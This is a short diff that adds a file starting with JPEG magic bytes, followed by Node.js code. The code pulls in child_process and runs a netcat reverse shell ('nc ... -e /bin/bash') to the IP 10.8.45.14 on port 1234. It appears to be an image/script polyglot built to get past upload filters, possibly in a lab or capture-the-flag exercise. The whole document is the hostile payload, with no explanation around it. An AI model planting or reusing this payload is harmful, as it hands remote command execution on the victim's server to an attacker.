@@ -1,0 +1,3 @@
+ÿØÿî
+-var x = global.process.mainModule.require
+-x('child_process').exec('nc 10.8.45.14 1234 -e /bin/bash')
